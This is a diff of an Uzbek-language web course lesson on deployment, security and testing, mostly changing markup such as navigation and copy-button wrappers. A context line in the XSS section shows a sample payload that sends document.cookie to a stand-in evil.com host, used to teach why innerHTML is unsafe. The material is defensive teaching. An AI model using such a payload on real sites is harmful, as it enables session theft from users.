@@ -3,14 +3,14 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Deploy, xavfsizlik va testlash — Full-Stack Qo&#x27;llanma</title>
+<title>Deploy, xavfsizlik va testlash — Full-stack qo&#x27;llanma</title>
 <meta name="description" content="Ilovani internetga chiqarish (PaaS, VPS, Docker, Nginx, HTTPS), CI/CD, OWASP asosiy zaifliklari (XSS, SQLi, CSRF), unumdorlik hamda avtomatik testlar (node:test, Supertest, Vitest).">
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🧭</text></svg>">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
 <link rel="stylesheet" href="../assets/css/style.css">
-<script>try{var t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;}catch(e){}</script>
+<script>document.documentElement.classList.add('js');try{var t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;}catch(e){}</script>
 </head>
 <body class="">
 <div class="progress" id="progress"></div>
@@ -25,7 +25,8 @@
 <div class="layout">
   <aside class="sidebar" id="sidebar">
     <a class="side-home" href="../index.html">🏠 Bosh sahifa</a>
-    <div class="side-title">Darslar</div>
+    <nav class="course-switch"><a class="active" href="../index.html">Full-stack qo&#x27;llanma</a><a href="../8-sinf/index.html">8-sinf: Web Full-stack kursi</a></nav>
+    <div class="side-title">Full-stack qo&#x27;llanma</div>
     <ol class="lesson-list" id="lessonList">
 <li><a href="../darslar/01-web-qanday-ishlaydi.html"><span class="num">01</span>Web qanday ishlaydi</a></li>
 <li><a href="../darslar/02-html.html"><span class="num">02</span>HTML — sahifa tuzilishi</a></li>
@@ -44,7 +45,7 @@
     </ol>
   </aside>
   <main class="content">
-<article class="lesson"><div class="lesson-hero"><div class="hero-icon">🚀</div><div><div class="crumb">14-dars · 14 tadan</div><h1>Deploy, xavfsizlik va testlash</h1><p class="lead">Ilovani internetga chiqarish (PaaS, VPS, Docker, Nginx, HTTPS), CI/CD, OWASP asosiy zaifliklari (XSS, SQLi, CSRF), unumdorlik hamda avtomatik testlar (node:test, Supertest, Vitest).</p></div></div>
+<article class="lesson"><div class="lesson-hero"><div class="hero-icon">🚀</div><div><div class="crumb">14-dars · 14 tadan</div><h1>Deploy, xavfsizlik va testlash</h1><p class="lead">Ilovani internetga chiqarish (PaaS, VPS, Docker, Nginx, HTTPS), CI/CD, OWASP asosiy zaifliklari (XSS, SQLi, CSRF), unumdorlik hamda avtomatik testlar (node:test, Supertest, Vitest).</p><div class="hero-level">Yuqori · ~150 daqiqa</div></div></div>
 
 <p>Kompyuteringizda ishlaydigan ilova hali mahsulot emas. Uni haqiqiy foydalanuvchilarga yetkazish uchun: (1) internetdagi serverga
 <b>joylash (deploy)</b>, (2) hujumlardan <b>himoyalash</b>, (3) har bir o'zgarishdan keyin hech narsa buzilmaganini <b>avtomatik tekshirish</b>
@@ -77,7 +78,7 @@ baza/S3/Redis'da); loglar <code>stdout</code> ga; build va ishga tushirish bosqi
   <li><b>Volume</b> — konteyner o'chsa ham saqlanadigan ma'lumot (baza fayllari).</li>
   <li><b>Docker Compose</b> — bir nechta konteynerni (API + baza) bitta faylda tasvirlash.</li>
 </ul>
-<div class="code"><div class="code-head"><span>Terminal</span><button class="copy" type="button">Nusxa olish</button></div><pre><code class="language-bash">docker build -t notes-app .
+<div class="code"><div class="code-head"><span>Terminal</span><span class="code-actions"><button class="copy" type="button">Nusxa olish</button></span></div><pre><code class="language-bash">docker build -t notes-app .
 docker run -d -p 3000:3000 --env-file .env --name notes notes-app
 docker ps                    # ishlayotgan konteynerlar
 docker logs -f notes         # loglar
@@ -97,7 +98,7 @@ docker stop notes &amp;&amp; docker rm notes</code></pre></div>
     <div class="node">PostgreSQL</div>
   </div>
 </div>
-<div class="code"><div class="code-head"><span>/etc/nginx/sites-available/notes</span><button class="copy" type="button">Nusxa olish</button></div><pre><code class="language-nginx">server {
+<div class="code"><div class="code-head"><span>/etc/nginx/sites-available/notes</span><span class="code-actions"><button class="copy" type="button">Nusxa olish</button></span></div><pre><code class="language-nginx">server {
     server_name notes.example.uz;
 
     location / {
@@ -115,7 +116,7 @@ docker stop notes &amp;&amp; docker rm notes</code></pre></div>
     gzip on;
     gzip_types text/css application/javascript application/json image/svg+xml;
 }</code></pre></div>
-<div class="code"><div class="code-head"><span>Terminal</span><button class="copy" type="button">Nusxa olish</button></div><pre><code class="language-bash"># PM2 — Node jarayonlarini boshqaruvchi: yiqilsa qayta ishga tushiradi, server qayta yuklansa ham
+<div class="code"><div class="code-head"><span>Terminal</span><span class="code-actions"><button class="copy" type="button">Nusxa olish</button></span></div><pre><code class="language-bash"># PM2 — Node jarayonlarini boshqaruvchi: yiqilsa qayta ishga tushiradi, server qayta yuklansa ham
 npm install -g pm2
 pm2 start src/server.js --name notes -i max     # CPU yadrolari soniga teng nusxa (cluster)
 pm2 save &amp;&amp; pm2 startup                         # tizim ishga tushganda avtomatik
@@ -132,7 +133,7 @@ avtomatik xavfsizlik yangilanishlari, PostgreSQL portini (5432) tashqariga ochma
 <h2 id="ci-cd-avtomatik-tekshirish-va-deploy"><a class="anchor" href="#ci-cd-avtomatik-tekshirish-va-deploy">#</a>CI/CD — avtomatik tekshirish va deploy</h2>
 <p><b>CI (Continuous Integration)</b> — har bir push/PR'da testlar va linter avtomatik ishlaydi. <b>CD (Continuous Delivery/Deployment)</b> —
 <code>main</code> ga merge qilingan kod avtomatik deploy qilinadi. GitHub'da buning uchun <b>GitHub Actions</b> bor.</p>
-<div class="code"><div class="code-head"><span>.github/workflows/ci.yml</span><button class="copy" type="button">Nusxa olish</button></div><pre><code class="language-yaml">name: CI
+<div class="code"><div class="code-head"><span>.github/workflows/ci.yml</span><span class="code-actions"><button class="copy" type="button">Nusxa olish</button></span></div><pre><code class="language-yaml">name: CI
 on:
   push:
     branches: [main]
@@ -187,7 +188,7 @@ oldingi darslarda uchratdik — endi tizimlashtiramiz.</p>
 </table></div>
 
 <h3>XSS chuqurroq va Content Security Policy</h3>
-<div class="code"><div class="code-head"><span>JavaScript</span><button class="copy" type="button">Nusxa olish</button></div><pre><code class="language-js">// Hujum: izoh sifatida yuboriladi
+<div class="code"><div class="code-head"><span>JavaScript</span><span class="code-actions"><button class="copy" type="button">Nusxa olish</button></span></div><pre><code class="language-js">// Hujum: izoh sifatida yuboriladi
 const comment = `&lt;img src=x onerror=&quot;fetch(&#x27;https://evil.com/steal?c=&#x27; + document.cookie)&quot;&gt;`;
 
 element.innerHTML = comment;     // ❌ skript bajariladi
@@ -201,7 +202,7 @@ element.textContent = comment;   // ✅ matn sifatida ko&#x27;rinadi
 // → URL&#x27;ni tekshiring: faqat http(s):// bilan boshlanganlarga ruxsat</code></pre></div>
 <p><b>CSP (Content-Security-Policy)</b> sarlavhasi — "zaxira himoya": XSS sodir bo'lsa ham, brauzer faqat ruxsat etilgan manbalardagi
 skriptlarni bajaradi. <code>helmet()</code> uni standart sozlamalar bilan qo'yadi:</p>
-<div class="code"><div class="code-head"><span>JavaScript</span><button class="copy" type="button">Nusxa olish</button></div><pre><code class="language-js">app.use(helmet({
+<div class="code"><div class="code-head"><span>JavaScript</span><span class="code-actions"><button class="copy" type="button">Nusxa olish</button></span></div><pre><code class="language-js">app.use(helmet({
   contentSecurityPolicy: {
     directives: {
       defaultSrc: [&quot;&#x27;self&#x27;&quot;],
@@ -261,7 +262,7 @@ yoki <code>WHERE id = ANY($1)</code> bilan hammasini bir so'rovda olish.</div>
 
 <div class="example"><div class="ex-head"><span class="ex-badge">Misol 1</span><h3>Unit testlar: Node.js'ning o'rnatilgan test runner'i</h3></div><div class="ex-body">
 <p>Node 20+ da qo'shimcha kutubxonasiz test yozish mumkin. 4-darsdagi savat funksiyasini test qilamiz.</p>
-<div class="code"><div class="code-head"><span>src/cart.js</span><button class="copy" type="button">Nusxa olish</button></div><pre><code class="language-js">export const BEPUL_YETKAZISH = 1_000_000;
+<div class="code"><div class="code-head"><span>src/cart.js</span><span class="code-actions"><button class="copy" type="button">Nusxa olish</button></span></div><pre><code class="language-js">export const BEPUL_YETKAZISH = 1_000_000;
 export const YETKAZISH_NARXI = 25_000;
 
 export function hisobla(items, { promo } = {}) {
@@ -274,7 +275,7 @@ export function hisobla(items, { promo } = {}) {
   const yetkazish = promodan === 0 || promodan &gt;= BEPUL_YETKAZISH ? 0 : YETKAZISH_NARXI;
   return { oraliq, yetkazish, jami: promodan + yetkazish };
 }</code></pre></div>
-<div class="code"><div class="code-head"><span>test/cart.test.js</span><button class="copy" type="button">Nusxa olish</button></div><pre><code class="language-js">import { describe, it } from &#x27;node:test&#x27;;
+<div class="code"><div class="code-head"><span>test/cart.test.js</span><span class="code-actions"><button class="copy" type="button">Nusxa olish</button></span></div><pre><code class="language-js">import { describe, it } from &#x27;node:test&#x27;;
 import assert from &#x27;node:assert/strict&#x27;;
 import { hisobla, YETKAZISH_NARXI } from &#x27;../src/cart.js&#x27;;
 
@@ -310,7 +311,7 @@ describe(&#x27;hisobla()&#x27;, () =&gt; {
     assert.throws(() =&gt; hisobla([{ narx: 100, soni: -1 }]), /Manfiy/);
   });
 });</code></pre></div>
-<div class="code"><div class="code-head"><span>Terminal</span><button class="copy" type="button">Nusxa olish</button></div><pre><code class="language-bash">node --test
+<div class="code"><div class="code-head"><span>Terminal</span><span class="code-actions"><button class="copy" type="button">Nusxa olish</button></span></div><pre><code class="language-bash">node --test
 # ▶ hisobla()
 #   ✔ bo&#x27;sh savat — hammasi nol (0.4ms)
 #   ✔ kichik xaridga yetkazish narxi qo&#x27;shiladi (0.1ms)
@@ -326,9 +327,9 @@ node --test --experimental-test-coverage   # kod qamrovi</code></pre></div>
 
 <div class="example"><div class="ex-head"><span class="ex-badge">Misol 2</span><h3>API integratsion testlari: Supertest + haqiqiy baza</h3></div><div class="ex-body">
 <p>13-darsdagi Notes API'ni test qilamiz. <code>app.js</code> va <code>server.js</code> alohida bo'lgani uchun (9-dars) testda port band qilinmaydi.</p>
-<div class="code"><div class="code-head"><span>Terminal</span><button class="copy" type="button">Nusxa olish</button></div><pre><code class="language-bash">npm install -D supertest
+<div class="code"><div class="code-head"><span>Terminal</span><span class="code-actions"><button class="copy" type="button">Nusxa olish</button></span></div><pre><code class="language-bash">npm install -D supertest
 npm pkg set scripts.test=&quot;node --env-file=.env.test --test&quot;</code></pre></div>
-<div class="code"><div class="code-head"><span>test/notes.api.test.js</span><button class="copy" type="button">Nusxa olish</button></div><pre><code class="language-js">import { describe, it, before, after, beforeEach } from &#x27;node:test&#x27;;
+<div class="code"><div class="code-head"><span>test/notes.api.test.js</span><span class="code-actions"><button class="copy" type="button">Nusxa olish</button></span></div><pre><code class="language-js">import { describe, it, before, after, beforeEach } from &#x27;node:test&#x27;;
 import assert from &#x27;node:assert/strict&#x27;;
 import request from &#x27;supertest&#x27;;
 import { app } from &#x27;../src/app.js&#x27;;
@@ -424,9 +425,9 @@ describe(&#x27;Notes&#x27;, () =&gt; {
 </div></div>
 
 <div class="example"><div class="ex-head"><span class="ex-badge">Misol 3</span><h3>React komponentlarini testlash: Vitest + Testing Library</h3></div><div class="ex-body">
-<div class="code"><div class="code-head"><span>Terminal</span><button class="copy" type="button">Nusxa olish</button></div><pre><code class="language-bash">cd client
+<div class="code"><div class="code-head"><span>Terminal</span><span class="code-actions"><button class="copy" type="button">Nusxa olish</button></span></div><pre><code class="language-bash">cd client
 npm install -D vitest jsdom @testing-library/react @testing-library/user-event @testing-library/jest-dom</code></pre></div>
-<div class="code"><div class="code-head"><span>client/vite.config.js (qo&#x27;shimcha)</span><button class="copy" type="button">Nusxa olish</button></div><pre><code class="language-js">export default defineConfig({
+<div class="code"><div class="code-head"><span>client/vite.config.js (qo&#x27;shimcha)</span><span class="code-actions"><button class="copy" type="button">Nusxa olish</button></span></div><pre><code class="language-js">export default defineConfig({
   plugins: [react()],
   test: {
     environment: &#x27;jsdom&#x27;,
@@ -435,7 +436,7 @@ npm install -D vitest jsdom @testing-library/react @testing-library/user-event @
   },
 });
 // src/test-setup.js:  import &#x27;@testing-library/jest-dom/vitest&#x27;;</code></pre></div>
-<div class="code"><div class="code-head"><span>client/src/components/NoteEditor.test.jsx</span><button class="copy" type="button">Nusxa olish</button></div><pre><code class="language-jsx">import { render, screen } from &#x27;@testing-library/react&#x27;;
+<div class="code"><div class="code-head"><span>client/src/components/NoteEditor.test.jsx</span><span class="code-actions"><button class="copy" type="button">Nusxa olish</button></span></div><pre><code class="language-jsx">import { render, screen } from &#x27;@testing-library/react&#x27;;
 import userEvent from &#x27;@testing-library/user-event&#x27;;
 import { vi } from &#x27;vitest&#x27;;
 import NoteEditor from &#x27;./NoteEditor&#x27;;
@@ -472,7 +473,7 @@ describe(&#x27;&lt;NoteEditor /&gt;&#x27;, () =&gt; {
     expect(await screen.findByText(&#x27;Tarmoq xatosi&#x27;)).toBeInTheDocument();
   });
 });</code></pre></div>
-<div class="code"><div class="code-head"><span>Terminal</span><button class="copy" type="button">Nusxa olish</button></div><pre><code class="language-bash">npx vitest          # watch rejimi
+<div class="code"><div class="code-head"><span>Terminal</span><span class="code-actions"><button class="copy" type="button">Nusxa olish</button></span></div><pre><code class="language-bash">npx vitest          # watch rejimi
 npx vitest run      # bir marta (CI uchun)</code></pre></div>
 <p>Testing Library falsafasi: komponentni foydalanuvchi ko'rgandek test qiling — CSS sinflari yoki ichki state orqali emas, <b>rol, yozuv va matn</b> orqali
 (<code>getByRole('button', { name: 'Saqlash' })</code>). Shu tufayli testlar accessibility'ni ham bilvosita tekshiradi.</p>
@@ -480,7 +481,7 @@ npx vitest run      # bir marta (CI uchun)</code></pre></div>
 
 <div class="example"><div class="ex-head"><span class="ex-badge">Misol 4</span><h3>Docker Compose bilan deploy va Render'ga joylash</h3></div><div class="ex-body">
 <h4>A) Ko'p bosqichli Dockerfile (frontend + backend bitta image'da)</h4>
-<div class="code"><div class="code-head"><span>notes-app/Dockerfile</span><button class="copy" type="button">Nusxa olish</button></div><pre><code class="language-dockerfile"># 1-bosqich: React&#x27;ni build qilish
+<div class="code"><div class="code-head"><span>notes-app/Dockerfile</span><span class="code-actions"><button class="copy" type="button">Nusxa olish</button></span></div><pre><code class="language-dockerfile"># 1-bosqich: React&#x27;ni build qilish
 FROM node:22-alpine AS client
 WORKDIR /app/client
 COPY client/package*.json ./
@@ -501,11 +502,11 @@ USER node
 EXPOSE 3000
 HEALTHCHECK CMD wget -qO- http://localhost:3000/api/health || exit 1
 CMD [&quot;node&quot;, &quot;src/server.js&quot;]</code></pre></div>
-<div class="code"><div class="code-head"><span>notes-app/.dockerignore</span><button class="copy" type="button">Nusxa olish</button></div><pre><code class="language-text">**/node_modules
+<div class="code"><div class="code-head"><span>notes-app/.dockerignore</span><span class="code-actions"><button class="copy" type="button">Nusxa olish</button></span></div><pre><code class="language-text">**/node_modules
 **/.env
 **/dist
 .git</code></pre></div>
-<div class="code"><div class="code-head"><span>notes-app/docker-compose.yml</span><button class="copy" type="button">Nusxa olish</button></div><pre><code class="language-yaml">services:
+<div class="code"><div class="code-head"><span>notes-app/docker-compose.yml</span><span class="code-actions"><button class="copy" type="button">Nusxa olish</button></span></div><pre><code class="language-yaml">services:
   db:
     image: postgres:17
     restart: unless-stopped
@@ -535,7 +536,7 @@ CMD [&quot;node&quot;, &quot;src/server.js&quot;]</code></pre></div>
 
 volumes:
   pgdata:</code></pre></div>
-<div class="code"><div class="code-head"><span>Terminal</span><button class="copy" type="button">Nusxa olish</button></div><pre><code class="language-bash"># .env (compose uchun):  DB_PASSWORD=...  JWT_SECRET=...
+<div class="code"><div class="code-head"><span>Terminal</span><span class="code-actions"><button class="copy" type="button">Nusxa olish</button></span></div><pre><code class="language-bash"># .env (compose uchun):  DB_PASSWORD=...  JWT_SECRET=...
 docker compose up -d --build
 docker compose logs -f app
 docker compose exec db psql -U postgres notes -c &quot;SELECT count(*) FROM notes;&quot;
